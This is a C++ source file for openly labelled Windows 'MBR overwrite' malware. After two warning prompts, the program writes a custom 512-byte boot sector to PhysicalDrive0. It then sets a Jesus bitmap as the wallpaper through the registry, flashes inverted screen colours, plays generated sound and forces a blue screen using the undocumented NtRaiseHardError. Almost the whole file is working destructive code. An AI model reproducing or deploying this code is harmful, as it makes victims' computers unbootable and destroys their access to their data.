#include <Windows.h>
#include <mmsystem.h>
#include <ctime>
#include "main.h"
#include "extractRsc.h"
#include "resource.h"
#include "setWallpaper.h"
#include <winternl.h>
#include <cstdlib>

const char MBRData[512] = { 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xE0, 0x8E, 0xE8, 0x8E, 0xD0, 0x66, 0xBC, 0x00, 0x7C, 0x00, 0x00, 0x66, 0x89, 0xE5, 0xEA, 0x1A, 0x7C, 0x00, 0x00, 0x30, 0xE4, 0xB0, 0x13, 0xCD, 0x10, 0x0F, 0x31, 0xA3, 0x6E, 0x7C, 0xE8, 0x2D, 0x00, 0xB0, 0xB6, 0xE6, 0x43, 0xBE, 0x70, 0x7C, 0xBF, 0xAA, 0x7C, 0xBA, 0x1D, 0x00, 0x8A, 0x0D, 0x47, 0xAD, 0xE6, 0x42, 0x88, 0xE0, 0xE6, 0x42, 0xE4, 0x61, 0x0C, 0x03, 0xE6, 0x61, 0xB8, 0x00, 0x86, 0xCD, 0x15, 0xE4, 0x61, 0x24, 0xFC, 0xE6, 0x61, 0x4A, 0x75, 0xE2, 0xEB, 0xFE, 0xB4, 0x02, 0x30, 0xFF, 0x30, 0xD2, 0xCD, 0x10, 0xBE, 0xC7, 0x7C, 0xAC, 0x08, 0xC0, 0x74, 0x08, 0xB4, 0x0E, 0xB3, 0x0F, 0xCD, 0x10, 0xEB, 0xF3, 0xC3, 0x00, 0x10, 0xEF, 0x07, 0x97, 0x0A, 0x6F, 0x09, 0x97, 0x0A, 0x01, 0x00, 0xEF, 0x07, 0x97, 0x0A, 0x6F, 0x09, 0x97, 0x0A, 0x01, 0x00, 0x97, 0x0A, 0x97, 0x0A, 0x6F, 0x09, 0x97, 0x0A, 0x01, 0x00, 0x97, 0x0A, 0x97, 0x0A, 0x6F, 0x09, 0x97, 0x0A, 0x01, 0x00, 0x97, 0x0A, 0x97, 0x0A, 0x6F, 0x09, 0x97, 0x0A, 0x01, 0x00, 0x97, 0x0A, 0x97, 0x0A, 0x6F, 0x09, 0x68, 0x08, 0x0C, 0x04, 0x04, 0x04, 0x08, 0x0C, 0x04, 0x04, 0x04, 0x04, 0x02, 0x02, 0x04, 0x04, 0x04, 0x02, 0x02, 0x04, 0x04, 0x04, 0x02, 0x02, 0x04, 0x04, 0x04, 0x02, 0x02, 0x04, 0x08, 0x42, 0x75, 0x74, 0x20, 0x63, 0x6C, 0x6F, 0x74, 0x68, 0x65, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x73, 0x65, 0x6C, 0x66, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x74, 0x68, 0x65, 0x20, 0x4C, 0x6F, 0x72, 0x64, 0x20, 0x4A, 0x65, 0x73, 0x75, 0x73, 0x20, 0x43, 0x68, 0x72, 0x69, 0x73, 0x74, 0x20, 0x28, 0x74, 0x68, 0x65, 0x20, 0x4D, 0x65, 0x73, 0x73, 0x69, 0x61, 0x68, 0x29, 0x2C, 0x20, 0x61, 0x6E, 0x64, 0x20, 0x6D, 0x61, 0x6B, 0x65, 0x20, 0x6E, 0x6F, 0x20, 0x70, 0x72, 0x6F, 0x76, 0x69, 0x73, 0x69, 0x6F, 0x6E, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x5B, 0x69, 0x6E, 0x64, 0x75, 0x6C, 0x67, 0x69, 0x6E, 0x67, 0x5D, 0x20, 0x74, 0x68, 0x65, 0x20, 0x66, 0x6C, 0x65, 0x73, 0x68, 0x20, 0x5B, 0x70, 0x75, 0x74, 0x20, 0x61, 0x20, 0x73, 0x74, 0x6F, 0x70, 0x20, 0x74, 0x6F, 0x20, 0x74, 0x68, 0x69, 0x6E, 0x6B, 0x69, 0x6E, 0x67, 0x20, 0x61, 0x62, 0x6F, 0x75, 0x74, 0x20, 0x74, 0x68, 0x65, 0x20, 0x65, 0x76, 0x69, 0x6C, 0x20, 0x63, 0x72, 0x61, 0x76, 0x69, 0x6E, 0x67, 0x73, 0x20, 0x6F, 0x66, 0x20, 0x79, 0x6F, 0x75, 0x72, 0x20, 0x70, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x20, 0x6E, 0x61, 0x74, 0x75, 0x72, 0x65, 0x5D, 0x20, 0x74, 0x6F, 0x20, 0x5B, 0x67, 0x72, 0x61, 0x74, 0x69, 0x66, 0x79, 0x20, 0x69, 0x74, 0x73, 0x5D, 0x20, 0x64, 0x65, 0x73, 0x69, 0x72, 0x65, 0x73, 0x20, 0x28, 0x6C, 0x75, 0x73, 0x74, 0x73, 0x29, 0x2E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA };

int WinMain(HINSTANCE hInst,HINSTANCE hInstPrev,PSTR cmdline,int cmdshow) {
	int fresult = MessageBox(NULL, TEXT("The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?"), TEXT("WARNING"), MB_ICONWARNING | MB_YESNO);
	if (fresult == IDNO) {
		return 0;
	}
	else if(fresult == IDYES) {
		int sresult = MessageBox(NULL, TEXT("THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?"), TEXT("WARNING"), MB_ICONWARNING | MB_YESNO);
		if (sresult == IDNO) {
			return 0;
		}
		else if (fresult == IDYES) {

		}
		else {
			return 1;
		}
	}
	else {
		return 1;
	}

	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		BlueScreen();
	}
	DWORD bytesWritten;
	WriteFile(hDevice, MBRData, sizeof(MBRData), &bytesWritten, NULL);
	CloseHandle(hDevice);

	//Extract Resource to C Drive
	const wchar_t* resourcePath=L"C:\\Jesus.bmp";
	CopyResource(resourcePath, IDB_JESUS, BITMAPFILE);
	setWallpaper();
	HKEY hKey;
	LONG regOpenResult;

	regOpenResult = RegOpenKeyEx(HKEY_CURRENT_USER, L"Control Panel\\Desktop", 0, KEY_WRITE, &hKey);
	if (regOpenResult != ERROR_SUCCESS) {
		BlueScreen();
	}
	else {
		RegCloseKey(hKey);
	}
	regOpenResult = RegOpenKeyEx(HKEY_CURRENT_USER, L"Control Panel\\Desktop", 0, KEY_WRITE, &hKey);
	if (regOpenResult != ERROR_SUCCESS) {
		BlueScreen();
	}
	TCHAR tcharValue[] = L"2";
	if (RegSetValueEx(hKey, L"WallpaperStyle", 0, REG_SZ, (LPBYTE)tcharValue, sizeof(tcharValue))!=ERROR_SUCCESS) {
		BlueScreen();
	}
	RegCloseKey(hKey);
	if (setWallpaper() != 0) {
		BlueScreen();
	}

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetDC(hwnd);
	int w = GetSystemMetrics(SM_CXSCREEN);
	int h = GetSystemMetrics(SM_CYSCREEN);
	HANDLE virusSoundHandle;
	DWORD virusSoundDword;
	//HANDLE virusMessageBoxHandle;
	//DWORD virusMessageBoxDword;
	virusSoundHandle = CreateThread(NULL,0,virusSound,NULL,0,&virusSoundDword);
	//virusMessageBoxHandle= CreateThread(NULL, 0, virusMessageBox, NULL, 0, &virusMessageBoxDword);
	double virusExecutingTime = clock();
	while (clock()-virusExecutingTime<=10000) {
		BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		Sleep(10);
	}
	if (virusSoundDword == STILL_ACTIVE) {
		WaitForSingleObject(virusSoundHandle, INFINITE);
	}
	//if (virusMessageBoxDword == STILL_ACTIVE) {
	//	WaitForSingleObject(virusMessageBoxHandle, INFINITE);
	//}
	BlueScreen();
	return 0;
}
DWORD WINAPI virusSound(LPVOID lpParam) {
	DWORD DwResult = 0;
	HWAVEOUT hwo = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM,1,8000,8000,1,8,0 };
	waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 10];

	for (DWORD t = 0; t < sizeof(buffer); t++) {
		buffer[t] = static_cast<char>(t * (t >>4));
	}

	WAVEHDR hdr = { buffer,sizeof(buffer),0,0,0,0,0,0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwo);
	Sleep(10000);
	return DwResult;
}
/*
DWORD WINAPI virusMessageBox(LPVOID lpParam) {
	DWORD DwResult = 0;
	srand(time(NULL));
	double virusExecutingTime = clock();
	while (clock() - virusExecutingTime <= 10000) {
		int virusMessageInt = rand() % 7;
		switch (virusMessageInt) {
		case 0:MessageBox(NULL,TEXT("LET EVERY person be loyally subject to the governing (civil) authorities. For there is no authority except from God [by His permission, His sanction], and those that exist do so by God's appointment. [Prov. 8:15.]"), TEXT("Romans 13:1"), MB_ICONERROR);
		case 1:MessageBox(NULL, TEXT("And the priest said to them, Go in peace. The way in which you go is before (under the eye of) the Lord."), TEXT("Judges 18:6"), MB_ICONERROR);
		case 2:MessageBox(NULL, TEXT("The Lord has sworn by [Himself Who is] the Glory andPride of Jacob, Surely I will never forget any of their [rebellious] deeds."), TEXT("Amos 8:7"), MB_ICONERROR);
		case 3:MessageBox(NULL, TEXT("How are the things of Esau [Edom] searched out! How are his hidden treasures sought out!"), TEXT("Obadiah 1:6"), MB_ICONERROR);
		case 4:MessageBox(NULL, TEXT("The Lord has sworn by [Himself Who is] the Glory andPride of Jacob, Surely I will never forget any of their [rebellious] deeds."), TEXT("1 Peter 3:5"), MB_ICONERROR);
		case 5:MessageBox(NULL, TEXT("JUDE, A servant of Jesus Christ (the Messiah), and brother of James, [writes this letter] to those who are called (chosen), dearly loved by God the Father and separated (set apart)and kept for Jesus Christ:"), TEXT("Jude 1:1"), MB_ICONERROR);
		case 6:MessageBox(NULL, TEXT("For we also were once thoughtless andsenseless, obstinate anddisobedient, deluded andmisled; [we too were once] slaves to all sorts of cravings andpleasures, wasting our days in malice and jealousy andenvy, hateful (hated, detestable) and hating one another."), TEXT("Titus 3:3"), MB_ICONERROR);
		}
		Sleep(50);
	}
	return DwResult;
}
*/
void BlueScreen() {
	BOOLEAN bl;
	ULONG Response;

	RtlAdjustPrivilegePtr pRtlAdjustPrivilege;
	NtRaiseHardErrorPtr pNtRaiseHardError;

	pRtlAdjustPrivilege = (RtlAdjustPrivilegePtr)GetProcAddress(GetModuleHandle(L"ntdll"), "RtlAdjustPrivilege");
	pNtRaiseHardError = (NtRaiseHardErrorPtr)GetProcAddress(GetModuleHandle(L"ntdll"), "NtRaiseHardError");

	if (pRtlAdjustPrivilege && pNtRaiseHardError) {
		pRtlAdjustPrivilege(19, TRUE, FALSE, &bl);
		pNtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response);
	}
}